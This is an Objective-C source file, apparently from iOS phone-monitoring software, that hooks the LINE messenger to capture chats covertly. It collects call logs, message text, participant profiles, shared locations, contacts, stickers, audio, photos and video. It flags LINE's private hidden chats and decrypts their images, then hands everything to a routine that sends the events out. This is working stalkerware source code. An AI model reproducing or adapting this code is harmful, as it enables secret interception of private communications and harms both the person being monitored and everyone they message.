//
//  LINEUtilsV2.m
//  MSFSP
//
//  Created by Makara Khloth on 8/20/15.
//
//

#import <objc/runtime.h>

#import "LINEUtilsV2.h"
#import "LINEUtils.h"
#import "FxIMEvent.h"
#import "FxRecipient.h"
#import "FxIMGeoTag.h"
#import "FxAttachment.h"
#import "DateTimeFormat.h"

#import "ManagedMessage.h"
#import "ManagedChat.h"
#import "ManagedUser.h"

#import "TalkUserDefaultManager.h"
#import "LineLocation.h"
#import "ContactModel.h"
#import "LineStickerManager.h"
#import "LineStickerPackage.h"
#import "LineFileManager.h"
#import "LineFileDownload.h"
#import "LineMessage.h"

@interface LINEUtilsV2 (private)
+ (NSArray *) participantsFromMembers: (NSArray *) aMembers;
+ (NSData *) profileImageDataWithSubpath: (NSString *) aSubpath;
+ (BOOL) isHiddenMessage: (ManagedChat *) aChat;

+ (void) captureSharedLocationIfExist: (FxIMEvent *) aEvent message: (ManagedMessage *) aMessage chat: (ManagedChat *) aChat;
+ (void) captureSharedContactIfExist: (FxIMEvent *) aEvent message: (ManagedMessage *) aMessage chat: (ManagedChat *) aChat;
+ (void) captureStickerIfExist: (FxIMEvent *) aEvent message: (ManagedMessage *) aMessage chat: (ManagedChat *) aChat;
+ (BOOL) captureAudioIfExist: (FxIMEvent *) aEvent message: (ManagedMessage *) aMessage chat: (ManagedChat *) aChat;
+ (BOOL) capturePhotoIfExist: (FxIMEvent *) aEvent message: (ManagedMessage *) aMessage chat: (ManagedChat *) aChat;
+ (BOOL) captureVideoIfExist: (FxIMEvent *) aEvent message: (ManagedMessage *) aMessage chat: (ManagedChat *) aChat;

+ (void) delayCaptureAttachment: (NSArray *) aArgs;
@end

@implementation LINEUtilsV2

+ (void) captureLINEVoIP: (id) aMessage
                    chat: (ManagedChat *) aChat
                outgoing: (BOOL) aOutgoing {
    NSString *userId = nil;
    NSString *userDisplayName = nil;
    NSInteger duration = 0;
    FxEventDirection direction = kEventDirectionUnknown;
    
    if (aOutgoing) {
        LineMessage *lineMessage = aMessage;
        NSArray *members = [aChat sortedMembers];
        for (ManagedUser *obj in members) {
            userId = [obj midString];
            userDisplayName	= [obj displayUserName];
            duration = [[(NSDictionary *)[lineMessage contentMetadata] objectForKey:@"DURATION"] intValue] / 1000;
            break;
        }
        direction = kEventDirectionOut;
    } else {
        ManagedMessage *message = aMessage;
        userId = [[message sender] midString];
        userDisplayName = [[message sender] displayUserName];
        duration = [message callInterval];
        direction = (duration == 0) ? kEventDirectionMissedCall : kEventDirectionIn;
    }
    
    FxVoIPEvent *voipEvent = nil;
    voipEvent = [LINEUtils createLINEVoIPEventForContactID:userId
                                               contactName:userDisplayName
                                                  duration:duration
                                                 direction:direction];
    DLog (@"LINE VoIP event, %@", voipEvent);
    
    [LINEUtils sendLINEVoIPEvent:voipEvent];
}

+ (void) captureLINEMessage: (ManagedMessage *) aMessage
                       chat: (ManagedChat *) aChat
                   outgoing: (BOOL) aOutgoing {
    
    NSString *userId					= nil;
    NSString *userDisplayName			= nil;
    NSString *userStatusMessage			= nil;
    NSData *userPictureProfileData		= nil;
    NSString *imServiceId				= @"line";
    NSString *textMessage               = [aMessage text];
    NSMutableArray *participants		= [NSMutableArray array];
    FxEventDirection direction          = aOutgoing ? kEventDirectionOut : kEventDirectionIn;
    NSString *conversationID            = [aChat midString];
    NSString *conversationName          = [aChat titleWithMemberCount:NO];
    NSData *conversationProfilePicData	= nil;
    FxIMMessageRepresentation textRep   = kIMMessageText;
    BOOL hidden                         = [self isHiddenMessage:aChat];
    
    if (direction == kEventDirectionOut) {
        Class $TalkUserDefaultManager = objc_getClass("TalkUserDefaultManager");
        userId	= [$TalkUserDefaultManager mid];
        userDisplayName = [$TalkUserDefaultManager name];
        userStatusMessage = [$TalkUserDefaultManager statusMessage];
        userPictureProfileData = [self profileImageDataWithSubpath:[$TalkUserDefaultManager profilePicturePath]];
        
        participants = [NSMutableArray arrayWithArray:[self participantsFromMembers:[aChat sortedMembers]]];
    } else {
        Class $TalkUserDefaultManager = objc_getClass("TalkUserDefaultManager");
        userId	= [[aMessage sender] midString];
        userDisplayName = [[aMessage sender] displayUserName];
        userStatusMessage = [[aMessage sender] statusMessage];
        userPictureProfileData = [self profileImageDataWithSubpath:[[aMessage sender] pictureURL]];
        
        FxRecipient *participant = [[[FxRecipient alloc] init] autorelease];
        participant.recipNumAddr = [$TalkUserDefaultManager mid];
        participant.recipContactName = [$TalkUserDefaultManager name];
        participant.mStatusMessage = [$TalkUserDefaultManager statusMessage];
        
        participants = [NSMutableArray arrayWithArray:[self participantsFromMembers:[aChat sortedMembers]]];
        [participants insertObject:participant atIndex:0];
        participant = nil;
        
        NSMutableArray *tempParticipants = [NSMutableArray arrayWithArray:participants];
        NSEnumerator *enumerator = [tempParticipants objectEnumerator];
        while (participant = [enumerator nextObject]) {
            if ([participant.recipNumAddr isEqualToString:userId]) {
                [participants removeObject:participant];
                break;
            }
        }
    }
    
    DLog(@"--------------------------------------------------------------------------------------");
    DLog(@"userId, %@", userId);
    DLog(@"userDisplayName, %@", userDisplayName);
    DLog(@"userStatusMessage, %@", userStatusMessage);
    DLog(@"userPictureProfileData, %lu", (unsigned long)[userPictureProfileData length]);
    DLog(@"imServiceId, %@", imServiceId);
    DLog(@"textMessage, [%lu] %@", (unsigned long)[textMessage length], textMessage);
    DLog(@"participants, %@", participants);
    DLog(@"direction, %d", direction);
    DLog(@"conversationID, %@", conversationID);
    DLog(@"conversationName, %@", conversationName);
    DLog(@"conversationProfilePicData, %lu", (unsigned long)[conversationProfilePicData length]);
    DLog(@"textRep, %d", textRep);
    DLog(@"hidden, %d", hidden);
    DLog(@"--------------------------------------------------------------------------------------");
    
    FxIMEvent *imEvent = [[FxIMEvent alloc] init];
    [imEvent setDateTime:[DateTimeFormat phoenixDateTime]];
    
    [imEvent setMIMServiceID:imServiceId];
    [imEvent setMServiceID:kIMServiceLINE];
    
    [imEvent setMDirection:(FxEventDirection)direction];
    [imEvent setMRepresentationOfMessage:textRep];
    [imEvent setMMessage:textMessage];
    // -- user
    [imEvent setMUserID:userId];
    [imEvent setMUserDisplayName:userDisplayName];
    [imEvent setMUserStatusMessage:userStatusMessage];
    [imEvent setMUserPicture:userPictureProfileData];
    [imEvent setMUserLocation:nil];
    // -- conversation
    [imEvent setMConversationID:conversationID];
    [imEvent setMConversationName:conversationName];
    [imEvent setMConversationPicture:conversationProfilePicData];
    // -- participant
    [imEvent setMParticipants:participants];
    // -- attachment
    // -- share location
    
    DLog(@"contentType, %d", [aMessage contentType]);
    
    [self captureSharedLocationIfExist:imEvent message:aMessage chat:aChat];
    [self captureSharedContactIfExist:imEvent message:aMessage chat:aChat];
    [self captureStickerIfExist:imEvent message:aMessage chat:aChat];
    BOOL wait1 = [self captureAudioIfExist:imEvent message:aMessage chat:aChat];
    BOOL wait2 = [self capturePhotoIfExist:imEvent message:aMessage chat:aChat];
    BOOL wait3 = [self captureVideoIfExist:imEvent message:aMessage chat:aChat];
    DLog(@"wait1, wait2, wait3, %d, %d, %d", wait1, wait2, wait3);
    
    // -- hidden chat
    textRep = [imEvent mRepresentationOfMessage];
    if (hidden) {
        textRep |= kIMMessageHidden;
        [imEvent setMRepresentationOfMessage:textRep];
    }
    
    if (wait1 || wait2 || wait3) {
        DLog(@"ATTENTION: Delay for one and only one of {audio, photo, video} to complete download");
    } else {
        [LINEUtils sendLINEEvent:imEvent];
    }
    
    [imEvent release];
}

#pragma mark - Private methods -

+ (NSArray *) participantsFromMembers: (NSArray *) aMembers {
    NSMutableArray *participants = [NSMutableArray array];
    for (ManagedUser *obj in aMembers) {
        FxRecipient *participant = [[[FxRecipient alloc] init] autorelease];
        participant.recipNumAddr = [obj midString];
        participant.recipContactName = [obj displayUserName];
        participant.mStatusMessage = [obj statusMessage];
        participant.mPicture = [self profileImageDataWithSubpath:[obj pictureURL]];
        
        [participants addObject:participant];
    }
    DLog (@"participants: %@", participants);
    return (participants);
}

+ (NSData *) profileImageDataWithSubpath: (NSString *) aSubpath {
    DLog(@"aSubpath, %@", aSubpath);
    NSData *profileImageData = nil;
    NSFileManager *fileManager = [NSFileManager defaultManager];
    if (aSubpath && [aSubpath length]) {
        NSString *profileImagePath = nil;
        
        // iOS 7
        NSArray *cachesPaths = NSSearchPathForDirectoriesInDomains(NSCachesDirectory, NSUserDomainMask, YES);
        profileImagePath = [cachesPaths objectAtIndex:0];
        profileImagePath = [profileImagePath stringByAppendingString:@"/Profile Images"];
        profileImagePath = [profileImagePath stringByAppendingString:aSubpath];
        profileImagePath = [profileImagePath stringByAppendingString:@"/200x200.jpg"];
        DLog(@"profileImagePath, %@", profileImagePath);
        
        profileImageData = [NSData dataWithContentsOfFile:profileImagePath];
        if (!profileImageData) {
            // iOS 8
            NSURL *url = [fileManager containerURLForSecurityApplicationGroupIdentifier:@"group.com.linecorp.line"];
            DLog(@"AppGroup url, %@", url);     // file:///private/var/mobile/Containers/Shared/AppGroup/C310A3BE-CFAD-47BA-9661-CFED604ED563/
            
            profileImagePath = [url path];      // /private/var/mobile/Containers/Shared/AppGroup/C310A3BE-CFAD-47BA-9661-CFED604ED563
            profileImagePath = [profileImagePath stringByAppendingString:@"/Library/Caches/Profile Images"];
            profileImagePath = [profileImagePath stringByAppendingString:aSubpath];
            profileImagePath = [profileImagePath stringByAppendingString:@"/200x200.jpg"];
            DLog(@"AppGroup profileImagePath, %@", profileImagePath);
            
            profileImageData = [NSData dataWithContentsOfFile:profileImagePath];
        }
    }
    DLog(@"profileImageData, %lu", (unsigned long)[profileImageData length]);
    return (profileImageData);
}

+ (BOOL) isHiddenMessage: (ManagedChat *) aChat {
    BOOL isHidden = NO;
    if ([aChat respondsToSelector:@selector(isPrivateChat)]) {
        isHidden = [aChat isPrivateChat];
    }
    return (isHidden);
}

#pragma mark - Shared location, Shared contact, Sticker, Audio, Photo and Video -

+ (void) captureSharedLocationIfExist: (FxIMEvent *) aEvent message: (ManagedMessage *) aMessage chat: (ManagedChat *) aChat {
    if ([aMessage contentType] == kLINEContentTypeShareLocation) {
        LineLocation *lineLocation = [aMessage lineLocation];
        if (lineLocation) {
            float hor = -1;
            NSString *locationPlace	= [lineLocation title];
            if ([locationPlace isEqualToString: @"Location"]) {
                locationPlace = [lineLocation address];
            }
            
            FxIMGeoTag *imGeoTag = [[FxIMGeoTag alloc] init];
            [imGeoTag setMLatitude:(float)[lineLocation latitude]];
            [imGeoTag setMLongitude:(float)[lineLocation longitude]];
            [imGeoTag setMHorAccuracy:hor];
            [imGeoTag setMPlaceName:locationPlace];
            DLog (@"imGeoTag, %@", imGeoTag);
            
            [aEvent setMShareLocation:imGeoTag];
            [aEvent setMRepresentationOfMessage:kIMMessageShareLocation];
            [imGeoTag release];
        }
    }
}

+ (void) captureSharedContactIfExist: (FxIMEvent *) aEvent message: (ManagedMessage *) aMessage chat: (ManagedChat *) aChat {
    if ([aMessage contentType] == kLINEContentTypeContact) {
        ContactModel *contactModel = [aMessage contactModel];
        NSString *displayName = [contactModel displayName]	? [contactModel displayName] : @"" ;
        NSString *contactID = [contactModel mid] ? [contactModel mid] : @"";
        DLog (@"LINE: contactID, %@", contactID);
        DLog (@"LINE: displayName, %@", displayName);
        
        NSString *contactMsg = [[NSString alloc] initWithFormat:@"Name: %@", displayName];
        DLog (@"contactMsg, %@", contactMsg);
        
        [aEvent setMMessage:contactMsg];
        [aEvent setMRepresentationOfMessage:kIMMessageContact];
    }
}

+ (void) captureStickerIfExist: (FxIMEvent *) aEvent message: (ManagedMessage *) aMessage chat: (ManagedChat *) aChat {
    if ([aMessage contentType] == kLINEContentTypeSticker) {
        [aEvent setMMessage:nil];
        
        Class $LineStickerManager = objc_getClass("LineStickerManager");
        LineStickerPackage *lineStickerPackage = [$LineStickerManager packageWithStickerID:[aMessage sticker]];
        DLog(@"lineStickerPackage, %@", [lineStickerPackage class]);
        UIImage *stickerImage = [lineStickerPackage imageForSticker:[aMessage sticker] type:0];
        NSData *stickerData = UIImagePNGRepresentation(stickerImage);
        if (stickerData) {
            FxAttachment *attachment = [[[FxAttachment alloc] init] autorelease];
            [attachment setMThumbnail:stickerData];
            
            [aEvent setMAttachments:[NSArray arrayWithObject:attachment]];
            [aEvent setMRepresentationOfMessage:kIMMessageSticker];
            /*
            NSString *tempPath = NSTemporaryDirectory();
            tempPath = [tempPath stringByAppendingString:@"sticker.png"];
            [stickerData writeToFile:tempPath atomically:YES];
            DLog(@"tempPath, %@", tempPath);
             */
        }
        DLog(@"stickerData: %lu, stickerImage: %@", (unsigned long)[stickerData length], stickerImage);
    }
}

+ (BOOL) captureAudioIfExist: (FxIMEvent *) aEvent message: (ManagedMessage *) aMessage chat: (ManagedChat *) aChat {
    BOOL wait = NO;
    if ([aMessage contentType] == kLINEContentTypeAudioMessage) {
        if ([aEvent mDirection] == kEventDirectionOut) {
            NSString *audioPath = [aMessage text]; // text property stores audio path in outgoing
            NSData *audioData = [NSData dataWithContentsOfFile:audioPath];
            FxAttachment *attachment = [LINEUtils attachment:audioData thumbnail:nil extension:[audioPath pathExtension]];
            if (attachment) {
                [aEvent setMAttachments:[NSArray arrayWithObject:attachment]];
                [aEvent setMRepresentationOfMessage:kIMMessageNone];
            }
        } else {
            NSString *audioPath = [[aMessage audioFileURL] path];
            NSString *messageId = [aMessage performSelector:@selector(id)];
            DLog (@"messageId, %@", messageId);
            DLog (@"audioPath, %@", audioPath);
            
            if (audioPath && messageId) {
                // -- load audio
                [LINEUtils loadAudio:[aMessage performSelector:@selector(id)]];
                wait = YES;
                
                NSNumber *hiddenChat = [NSNumber numberWithBool:[self isHiddenMessage:aChat]];
                NSArray *args = [NSArray arrayWithObjects:aEvent, audioPath, hiddenChat, nil];
                [NSThread detachNewThreadSelector:@selector(delayCaptureAttachment:)
                                         toTarget:self
                                       withObject:args];
            }
        }
    }
    return (wait);
}

+ (BOOL) capturePhotoIfExist: (FxIMEvent *) aEvent message: (ManagedMessage *) aMessage chat: (ManagedChat *) aChat {
    BOOL wait = NO;
    if ([aMessage contentType] == kLINEContentTypeImage) {
        NSAutoreleasePool *pool     = [[NSAutoreleasePool alloc] init];
        
        DLog(@"imageName: %@", [aMessage imageName]);
        DLog(@"imageURL: %@", [aMessage imageURL]);
        
        NSData *imageData = [aMessage imageData];
        NSData *thumbnailData = [aMessage thumbnail];
        DLog(@"imageData: %lu", (unsigned long)[imageData length]);
        DLog(@"thumbnailData: %lu", (unsigned long)[thumbnailData length]);
        
        if ([aEvent mDirection] == kEventDirectionOut) {
            FxAttachment *attachment = [LINEUtils attachment:imageData thumbnail:thumbnailData extension:@"jpg"];
            if (attachment) {
                [aEvent setMAttachments:[NSArray arrayWithObject:attachment]];
                [aEvent setMRepresentationOfMessage:kIMMessageNone];
            }
        } else {
            // -- Download incoming image for hidden and unhidden images
            if (!imageData) {
                __block BOOL imageDownloaded = NO;
                Class $LineFileManager = objc_getClass("LineFileManager");
                // Download image
                LineFileDownload *downloadedImage = [$LineFileManager downloadImageNamed:[aMessage imageName]
                                                                                   atURL:[aMessage imageURL]
                                                                                 inStore:1
                                                                         completionBlock:^(){
                                                                              DLog(@"Finished downloading image");
                                                                              imageDownloaded = YES;
                                                                         }
                                                     ];
                
                NSInteger count = 0;
                while (!imageDownloaded && count < 5) {
                    count++;
                    [NSThread sleepForTimeInterval:1];
                    DLog(@"downloadedImage, %@", downloadedImage);
                }
                
                NSData *tempData = [downloadedImage dataDownloaded];
                // For hidden message, the data we got from tempData is the encrypted one
                if ([self isHiddenMessage:aChat]) {
                    imageData = [aMessage decryptedImageDataWithData:tempData];
                }
                // For unhidden message, the data we got from tempData is the plain data
                else {
                    imageData = tempData;
                }
                DLog(@"Downloaded, imageData: %lu", (unsigned long)[imageData length]);
                
                FxAttachment *attachment = [LINEUtils attachment:imageData thumbnail:thumbnailData extension:@"jpg"];
                if (attachment) {
                    [aEvent setMAttachments:[NSArray arrayWithObject:attachment]];
                    [aEvent setMRepresentationOfMessage:kIMMessageNone];
                }
                
            } else {
                FxAttachment *attachment = [LINEUtils attachment:imageData thumbnail:thumbnailData extension:@"jpg"];
                if (attachment) {
                    [aEvent setMAttachments:[NSArray arrayWithObject:attachment]];
                    [aEvent setMRepresentationOfMessage:kIMMessageNone];
                }
            }
        }
        [pool release];
    }
    return (wait);
}

+ (BOOL) captureVideoIfExist: (FxIMEvent *) aEvent message: (ManagedMessage *) aMessage chat: (ManagedChat *) aChat {
    BOOL wait = NO;
    if ([aMessage contentType] == kLINEContentTypeVideo) {
        NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
        
        NSData *thumbnailData = [aMessage thumbnail];
        DLog(@"thumbnailData: %lu", (unsigned long)[thumbnailData length]);
        
        NSString *videoPath = [aMessage text]; // text property stores video path in outgoing
        // e.g: /private/var/mobile/Applications/AE1DDA64-3BBE-4AAB-A3C4-08DA00035AA7/tmp/461932972.203773.mp4;
        
        NSData *videoData = [NSData dataWithContentsOfFile:videoPath];
        DLog(@"videoData, %lu", (unsigned long)[videoData length]);
        
        FxAttachment *attachment = [LINEUtils attachment:videoData thumbnail:thumbnailData extension:[videoPath pathExtension]];
        if (attachment) {
            [aEvent setMAttachments:[NSArray arrayWithObject:attachment]];
            [aEvent setMRepresentationOfMessage:kIMMessageNone];
        }
        
        [pool release];
    }
    return (wait);
}

#pragma mark - Utils -

+ (void) delayCaptureAttachment: (NSArray *) aArgs {
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
    [aArgs retain];
    @try {
        FxIMEvent *imEvent = [aArgs objectAtIndex:0];
        NSString *attachmentPath = [aArgs objectAtIndex:1];
        BOOL hiddenChat = [[aArgs objectAtIndex:2] boolValue];
        
        [NSThread sleepForTimeInterval:1.0f];
        
        NSData *attachmentData = [NSData dataWithContentsOfFile:attachmentPath];
        FxAttachment *attachment = [LINEUtils attachment:attachmentData thumbnail:nil extension:[attachmentPath pathExtension]];
        if (attachment) {
            FxIMMessageRepresentation textRep = kIMMessageNone;
            if (hiddenChat) {
                textRep |= kIMMessageHidden;
            }
            [imEvent setMAttachments:[NSArray arrayWithObject:attachment]];
            [imEvent setMRepresentationOfMessage:textRep];
        }
        DLog(@"attachmentData: %lu, ext: %@", (unsigned long)[attachmentData length], [attachmentPath pathExtension]);
        [LINEUtils sendLINEEvent:imEvent];
    }
    @catch (NSException *exception) {
        DLog(@"exception: %@", exception);
    }
    @finally {
        ;
    }
    [aArgs release];
    [pool release];
}

@end
